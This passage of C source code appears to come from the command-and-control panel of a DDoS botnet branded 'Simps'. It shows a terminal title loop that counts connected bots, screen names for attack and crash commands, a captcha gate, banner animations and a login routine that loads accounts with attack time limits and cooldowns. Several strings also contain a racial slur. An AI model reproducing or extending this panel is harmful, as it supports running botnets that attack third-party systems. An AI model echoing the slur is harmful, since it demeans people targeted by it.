			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Fire] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 27)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Troll] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 28)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Milk] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 29)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Bat] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 30)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [DownBad] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 31)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [AttackSent] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 32)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Gay] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 33)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Crash-Cnc] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 34)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Daddy-UR0A] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 35)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Hello-Son] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 36)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Simpsons] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 37)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Bomb] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 38)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Owners] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 39)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Wipe] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 40)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Cls] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 41)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Clears] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 42)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Pkill] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 43)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [@-Crash] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 44)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Arches] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 45)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Add-User] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 46)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Add-Admin] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 47)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Rem-User] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 48)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [/-Crash] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 49)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [--Crash] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 50)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Online] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 51)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Acc-Info] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 52)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Nigger-Dad] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 53)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Shrek] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 54)
		{
			sprintf(string, "%c]0;PuTTY (inactive) %c", '\033', '\007');
		}
		if (Title[datafd].login == 55)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [ToggleAttacks-on] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 56)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [ToggleAttacks-off] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 57)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [info-change] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 58)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Motd] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 59)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [Motd-Off] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}
		if (Title[datafd].login == 60)
		{
			sprintf(string, "%c]0;Simps | Servers: [%d] | Devices: [%d] | Users Online: [%d] | Screen: [No-Banners] | Expiry: [%s] %c", '\033', x86_64Connected(), BotsConnected(), UsersConnected, Title[datafd].string, '\007');
		}

		if (send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1)
			return;
		memset(string, 0, sizeof(string));
		sprintf(string, "\e[3J");
		if (send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1)
			return;
		memset(string, 0, sizeof(string));
		usleep(750000);
	}
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void *BotWorker(void *sock)
{
	int datafd = (int)sock;
	int find_line;
	int SuccessfulLogin = 1;
	pthread_t title;
	Title[datafd].login = 1;
	Title[datafd].login = 2;
	Title[datafd].login = 3;
	Title[datafd].login = 4;
	Title[datafd].login = 5;
	Title[datafd].login = 6;
	Title[datafd].login = 7;
	Title[datafd].login = 8;
	Title[datafd].login = 9;
	Title[datafd].login = 10;
	Title[datafd].login = 11;
	Title[datafd].login = 12;
	Title[datafd].login = 13;
	Title[datafd].login = 14;
	Title[datafd].login = 15;
	Title[datafd].login = 16;
	Title[datafd].login = 17;
	Title[datafd].login = 18;
	Title[datafd].login = 19;
	Title[datafd].login = 20;
	Title[datafd].login = 21;
	Title[datafd].login = 22;
	Title[datafd].login = 23;
	Title[datafd].login = 24;
	Title[datafd].login = 25;
	Title[datafd].login = 26;
	Title[datafd].login = 27;
	Title[datafd].login = 28;
	Title[datafd].login = 29;
	Title[datafd].login = 30;
	Title[datafd].login = 31;
	Title[datafd].login = 32;
	Title[datafd].login = 33;
	Title[datafd].login = 34;
	Title[datafd].login = 35;
	Title[datafd].login = 36;
	Title[datafd].login = 37;
	Title[datafd].login = 38;
	Title[datafd].login = 39;
	Title[datafd].login = 40;
	Title[datafd].login = 41;
	Title[datafd].login = 42;
	Title[datafd].login = 43;
	Title[datafd].login = 44;
	Title[datafd].login = 45;
	Title[datafd].login = 46;
	Title[datafd].login = 47;
	Title[datafd].login = 48;
	Title[datafd].login = 49;
	Title[datafd].login = 50;
	Title[datafd].login = 51;
	Title[datafd].login = 52;
	Title[datafd].login = 53;
	Title[datafd].login = 54;
	Title[datafd].login = 55;
	Title[datafd].login = 56;
	Title[datafd].login = 57;
	Title[datafd].login = 58;
	Title[datafd].login = 59;
	Title[datafd].login = 60;
	char buf[2048];
	char *admin = "admin";
	char *common = "common";
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);

	Title[datafd].login = 54;
	pthread_create(&title, NULL, &TitleWriter, sock);
	memset(buf, 0, sizeof buf);

	if (send(datafd, "", 1, MSG_NOSIGNAL) == -1)
		goto end;
	if (fdgets(buf, sizeof buf, datafd) < 1)
		goto end;
	trim(buf);
	if (strcmp(buf, authkey) != 0)
		goto end;
	memset(buf, 0, 2048);
	if (send(datafd, "\033[1A", 4, MSG_NOSIGNAL) == -1)
		goto end;

	Title[datafd].login = 14;
	char nigCaptcha1[5000];
	char nigCaptcha2[5000];
	char nigCaptcha3[5000];
	char captcha[90], captcha2[90];
	srand(time(NULL) ^ getpid());
	sprintf(captcha, "%d", rand() % 20);
	sprintf(captcha2, "%d", rand() % 20);

	sprintf(nigCaptcha1, "\e[31m╔════════════════════════\e[95m═════════════════════════╗\r\n");
	sprintf(nigCaptcha2, "\e[31m║ Enter The Captcha To Ge\e[95mt Acess To Simps Botnet. ║\r\n");
	sprintf(nigCaptcha3, "\e[31m╚════════════════════════\e[95m═════════════════════════╝\r\n");
	sprintf(botnet, "\e[37mSolve: %s + %s> ", captcha, captcha2);

	if (send(datafd, nigCaptcha1, strlen(nigCaptcha1), MSG_NOSIGNAL) == -1)
		goto end;
	memset(nigCaptcha1, 0, sizeof(nigCaptcha1));

	if (send(datafd, nigCaptcha2, strlen(nigCaptcha2), MSG_NOSIGNAL) == -1)
		goto end;
	memset(nigCaptcha2, 0, sizeof(nigCaptcha2));
	if (send(datafd, nigCaptcha3, strlen(nigCaptcha3), MSG_NOSIGNAL) == -1)
		goto end;
	memset(nigCaptcha3, 0, sizeof(nigCaptcha3));
	if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
		goto end;
	memset(botnet, 0, sizeof(botnet));

	if (fdgets(buf, sizeof(buf), datafd) < 1)
		goto end;
	trim(buf);
	if (atoi(buf) != atoi(captcha) + atoi(captcha2))
	{
		sprintf(botnet, "\e[37mInvalid Captcha\e[31m!\r\n");
		if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
			goto end;
		memset(botnet, 0, sizeof(botnet));
		sleep(3);
		goto end;
	}

	FILE *fp;
	int i = 0;
	int c;

	fp = fopen("Login.txt", "r");
	for (c = getc(fp); c != EOF; c = getc(fp))
	{
		if (c == '\n')
		{
			i++;
		}
	}
	int j = 0;
	rewind(fp);
	while (j != i)
	{
		fscanf(fp, "%s %s %s %d %d %s", accounts[j].username, accounts[j].password, accounts[j].id, &accounts[j].maxtime, &accounts[j].cooldown, &accounts[j].expiry);
		++j;
	}

	/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

	Title[datafd].login = 15;
	pthread_t timeloggedin;
	char login1a[5000];
	char login2a[5000];
	char login3a[5000];
	char login4a[5000];
	char login5a[5000];
	char login6a[5000];
	char login7a[5000];
	char login8a[5000];
	char login9a[5000];
	char login1b[5000];
	char login2b[5000];
	char login3b[5000];
	char login4b[5000];
	char login5b[5000];
	char login6b[5000];
	char login7b[5000];
	char login8b[5000];
	char login9b[5000];
	char login1c[5000];
	char login2c[5000];
	char login3c[5000];
	char login4c[5000];
	char login5c[5000];
	char login6c[5000];
	char login7c[5000];
	char login8c[5000];
	char login9c[5000];
	char login1d[5000];
	char login2d[5000];
	char login3d[5000];
	char login4d[5000];
	char login5d[5000];
	char login6d[5000];
	char login7d[5000];
	char login8d[5000];
	char login9d[5000];
	char login1e[5000];
	char login2e[5000];
	char login3e[5000];
	char login4e[5000];
	char login5e[5000];
	char login6e[5000];
	char login7e[5000];
	char login8e[5000];
	char login9e[5000];
	char login1f[5000];
	char login2f[5000];
	char login3f[5000];
	char login4f[5000];
	char login1[5000];

	sprintf(login1a, "\e[31m██╗    ██╗\r\n");
	sprintf(login2a, "\e[31m██║    ██║\r\n");
	sprintf(login3a, "\e[31m██║ █╗ ██║\r\n");
	sprintf(login4a, "\e[31m██║███╗██║\r\n");
	sprintf(login5a, "\e[31m╚███╔███╔╝\r\n");
	sprintf(login6a, "\e[31m ╚══╝╚══╝ \r\n");
	sprintf(login7a, "\e[31m\r\n");

	sprintf(login8a, "\e[95m██╗    ██╗███████╗\r\n");
	sprintf(login9a, "\e[95m██║    ██║██╔════╝\r\n");
	sprintf(login1b, "\e[95m██║ █╗ ██║█████╗  \r\n");
	sprintf(login2b, "\e[95m██║███╗██║██╔══╝  \r\n");
	sprintf(login3b, "\e[95m╚███╔███╔╝███████╗ \r\n");
	sprintf(login4b, "\e[95m ╚══╝╚══╝ ╚══════╝ \r\n");
	sprintf(login5b, "\e[95m\r\n");

	sprintf(login6b, "\e[31m██╗    ██╗███████╗██╗    \r\n");
	sprintf(login7b, "\e[31m██║    ██║██╔════╝██║    \r\n");
	sprintf(login8b, "\e[31m██║ █╗ ██║█████╗  ██║    \r\n");
	sprintf(login9b, "\e[31m██║███╗██║██╔══╝  ██║    \r\n");
	sprintf(login1c, "\e[31m╚███╔███╔╝███████╗███████╗\r\n");
	sprintf(login2c, "\e[31m ╚══╝╚══╝ ╚══════╝╚══════╝\r\n");
	sprintf(login3c, "\e[31m\r\n");

	sprintf(login4c, "\e[95m██╗    ██╗███████╗██╗      ██████╗\r\n");
	sprintf(login5c, "\e[95m██║    ██║██╔════╝██║     ██╔════╝\r\n");
	sprintf(login6c, "\e[95m██║ █╗ ██║█████╗  ██║     ██║     \r\n");
	sprintf(login7c, "\e[95m██║███╗██║██╔══╝  ██║     ██║    \r\n");
	sprintf(login8c, "\e[95m╚███╔███╔╝███████╗███████╗╚██████╗\r\n");
	sprintf(login9c, "\e[95m ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝\r\n");
	sprintf(login1d, "\e[95m\r\n");

	sprintf(login2d, "\e[31m██╗    ██╗███████╗██╗      ██████╗ ██████╗ \r\n");
	sprintf(login3d, "\e[31m██║    ██║██╔════╝██║     ██╔════╝██╔═══██║\r\n");
	sprintf(login4d, "\e[31m██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║\r\n");
	sprintf(login5d, "\e[31m██║███╗██║██╔══╝  ██║     ██║     ██║   ██║\r\n");
	sprintf(login6d, "\e[31m╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝ \r\n");
	sprintf(login7d, "\e[31m ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ \r\n");
	sprintf(login8d, "\e[31m\r\n");

	sprintf(login9d, "\e[95m██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗\r\n");
	sprintf(login1e, "\e[95m██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║\r\n");
	sprintf(login2e, "\e[95m██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║\r\n");
	sprintf(login3e, "\e[95m██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║\r\n");
	sprintf(login4e, "\e[95m╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║\r\n");
	sprintf(login5e, "\e[95m ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝\r\n");
	sprintf(login6e, "\e[95m\r\n");

	sprintf(login7e, "\e[31m██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗\r\n");
	sprintf(login8e, "\e[31m██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝\r\n");
	sprintf(login9e, "\e[31m██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗ \r\n");
	sprintf(login1f, "\e[31m██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝ \r\n");
	sprintf(login2f, "\e[31m╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗\r\n");
	sprintf(login3f, "\e[31m ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝\r\n");
	sprintf(login4f, "\e[31m\r\n");

	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, login1a, strlen(login1a), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login1a, 0, sizeof(login1a));
	if (send(datafd, login2a, strlen(login2a), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login2a, 0, sizeof(login2a));
	if (send(datafd, login3a, strlen(login3a), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login3a, 0, sizeof(login3a));
	if (send(datafd, login4a, strlen(login4a), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login4a, 0, sizeof(login4a));
	if (send(datafd, login5a, strlen(login5a), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login5a, 0, sizeof(login5a));
	if (send(datafd, login6a, strlen(login6a), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login6a, 0, sizeof(login6a));
	if (send(datafd, login7a, strlen(login7a), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login7a, 0, sizeof(login7a));
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, login8a, strlen(login8a), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login8a, 0, sizeof(login8a));
	if (send(datafd, login9a, strlen(login9a), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login9a, 0, sizeof(login9a));
	if (send(datafd, login1b, strlen(login1b), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login1b, 0, sizeof(login1b));
	if (send(datafd, login2b, strlen(login2b), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login2b, 0, sizeof(login2b));
	if (send(datafd, login3b, strlen(login3b), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login3b, 0, sizeof(login3b));
	if (send(datafd, login4b, strlen(login4b), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login4b, 0, sizeof(login4b));
	if (send(datafd, login5b, strlen(login5b), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login5b, 0, sizeof(login5b));
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, login6b, strlen(login6b), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login6b, 0, sizeof(login6b));
	if (send(datafd, login7b, strlen(login7b), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login7b, 0, sizeof(login7b));
	if (send(datafd, login8b, strlen(login8b), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login8b, 0, sizeof(login8b));
	if (send(datafd, login9b, strlen(login9b), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login9b, 0, sizeof(login9b));
	if (send(datafd, login1c, strlen(login1c), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login1c, 0, sizeof(login1c));
	if (send(datafd, login2c, strlen(login2c), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login2c, 0, sizeof(login2c));
	if (send(datafd, login3c, strlen(login3c), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login3c, 0, sizeof(login3c));
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, login4c, strlen(login4c), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login4c, 0, sizeof(login4c));
	if (send(datafd, login5c, strlen(login5c), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login5c, 0, sizeof(login5c));
	if (send(datafd, login6c, strlen(login6c), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login6c, 0, sizeof(login6c));
	if (send(datafd, login7c, strlen(login7c), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login7c, 0, sizeof(login7c));
	if (send(datafd, login8c, strlen(login8c), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login8c, 0, sizeof(login8c));
	if (send(datafd, login9c, strlen(login9c), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login9c, 0, sizeof(login9c));
	if (send(datafd, login1d, strlen(login1d), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login1d, 0, sizeof(login1d));
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, login2d, strlen(login2d), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login2d, 0, sizeof(login2d));
	if (send(datafd, login3d, strlen(login3d), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login3d, 0, sizeof(login3d));
	if (send(datafd, login4d, strlen(login4d), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login4d, 0, sizeof(login4d));
	if (send(datafd, login5d, strlen(login5d), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login5d, 0, sizeof(login5d));
	if (send(datafd, login6d, strlen(login6d), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login6d, 0, sizeof(login6d));
	if (send(datafd, login7d, strlen(login7d), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login7d, 0, sizeof(login7d));
	if (send(datafd, login8d, strlen(login8d), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login8d, 0, sizeof(login8d));
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, login9d, strlen(login9d), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login9d, 0, sizeof(login9d));
	if (send(datafd, login1e, strlen(login1e), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login1e, 0, sizeof(login1e));
	if (send(datafd, login2e, strlen(login2e), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login2e, 0, sizeof(login2e));
	if (send(datafd, login3e, strlen(login3e), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login3e, 0, sizeof(login3e));
	if (send(datafd, login4e, strlen(login4e), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login4e, 0, sizeof(login4e));
	if (send(datafd, login5e, strlen(login5e), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login5e, 0, sizeof(login5e));
	if (send(datafd, login6e, strlen(login6e), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login6e, 0, sizeof(login6e));
	usleep(250000);
	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, login7e, strlen(login7e), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login7e, 0, sizeof(login7e));
	if (send(datafd, login8e, strlen(login8e), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login8e, 0, sizeof(login8e));
	if (send(datafd, login9e, strlen(login9e), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login9e, 0, sizeof(login9e));
	if (send(datafd, login1f, strlen(login1f), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login1f, 0, sizeof(login1f));
	if (send(datafd, login2f, strlen(login2f), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login2f, 0, sizeof(login2f));
	if (send(datafd, login3f, strlen(login3f), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login3f, 0, sizeof(login3f));
	if (send(datafd, login4f, strlen(login4f), MSG_NOSIGNAL) == -1)
		goto end;
	memset(login4f, 0, sizeof(login4f));
	usleep(250000);
	if (send(datafd, "\033[A", 4, MSG_NOSIGNAL) == -10)
		goto login;

	/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

login:
	Title[datafd].login = 1;
	char user1[5000];
	char user2[5000];
	char user3[5000];
	char user4[5000];
	char user5[5000];
	char user6[5000];
	char user7[5000];
	char user8[5000];
	char user9[5000];
	char username[5000];

	sprintf(user1, "\e[31m         ╔════════\e[95m════════╗ \r\n");
	sprintf(user2, "\e[31m         ║ [+] Log\e[95min. [+] ║ \r\n");
	sprintf(user3, "\e[31m╔════════╩════════\e[95m════════╩════════╗\r\n");
	sprintf(user4, "\e[31m║  Welcome to Simp\e[95ms Net Made By:   ║\r\n");
	sprintf(user5, "\e[31m║      @ur0a_ And \e[95mB1narythag0d     ║\r\n");
	sprintf(user6, "\e[31m║           Please\e[95m Login           ║\r\n");
	sprintf(user7, "\e[31m║       With Your \e[95mUser Info        ║\r\n");
	sprintf(user8, "\e[31m║    Follow The Ru\e[95mles And Enjoy    ║\r\n");
	sprintf(user9, "\e[31m╚═════════════════\e[95m═════════════════╝\r\n");

	sprintf(username, "\e[31mUsername\e[95m:\e[96m ");

	if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
		goto end;
	if (send(datafd, user1, strlen(user1), MSG_NOSIGNAL) == -1)
		goto end;
	memset(user1, 0, sizeof(user1));
	if (send(datafd, user2, strlen(user2), MSG_NOSIGNAL) == -1)
		goto end;
	memset(user2, 0, sizeof(user2));
	if (send(datafd, user3, strlen(user3), MSG_NOSIGNAL) == -1)
		goto end;
	memset(user3, 0, sizeof(user3));
	if (send(datafd, user4, strlen(user4), MSG_NOSIGNAL) == -1)
		goto end;
	memset(user4, 0, sizeof(user4));
	if (send(datafd, user5, strlen(user5), MSG_NOSIGNAL) == -1)
		goto end;
	memset(user5, 0, sizeof(user5));
	if (send(datafd, user6, strlen(user6), MSG_NOSIGNAL) == -1)
		goto end;
	memset(user6, 0, sizeof(user6));
	if (send(datafd, user7, strlen(user7), MSG_NOSIGNAL) == -1)
		goto end;
	memset(user7, 0, sizeof(user7));
	if (send(datafd, user8, strlen(user8), MSG_NOSIGNAL) == -1)
		goto end;
	memset(user8, 0, sizeof(user8));
	if (send(datafd, user9, strlen(user9), MSG_NOSIGNAL) == -1)
		goto end;
	memset(user9, 0, sizeof(user9));
	if (send(datafd, username, strlen(username), MSG_NOSIGNAL) == -1)
		goto end;
	memset(username, 0, sizeof(username));
	if (fdgets(buf, sizeof buf, datafd) < 1)
		goto end;
	trim(buf);
	char nickstring[30];
	strcpy(nickstring, buf);
	memset(buf, 0, sizeof(buf));
	find_line = Find_Login(nickstring);
	if (strcmp(nickstring, accounts[find_line].username) != 0)
		goto failed;
	memset(buf, 0, 2048);

	char password[5000];

	sprintf(password, "\e[31mPassword\e[95m:\e[30m ");
	if (send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1)
		goto end;
	memset(password, 0, sizeof(password));

	if (fdgets(buf, sizeof buf, datafd) < 1)
